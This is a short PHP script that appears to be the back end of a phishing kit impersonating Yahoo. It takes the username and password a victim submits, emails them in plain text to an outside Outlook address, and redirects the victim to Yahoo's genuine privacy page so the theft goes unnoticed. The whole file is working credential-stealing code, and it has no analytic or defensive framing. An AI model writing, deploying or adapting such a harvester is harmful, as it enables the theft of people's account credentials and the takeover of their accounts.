<?php 
$username = $_POST['username'] ;
$password = $_POST['password'] ;
$email = "heathersparkly@outlook.com" ;
$redirectTo = "https://info.yahoo.com/privacy/us/yahoo/" ;
$message = 'Username: ' .$username . ' <br> password : ' . $password ; 
mail($email, "Yahoo Password", $message) ;
header("Location: $redirectTo") ;
//echo $message ;
?>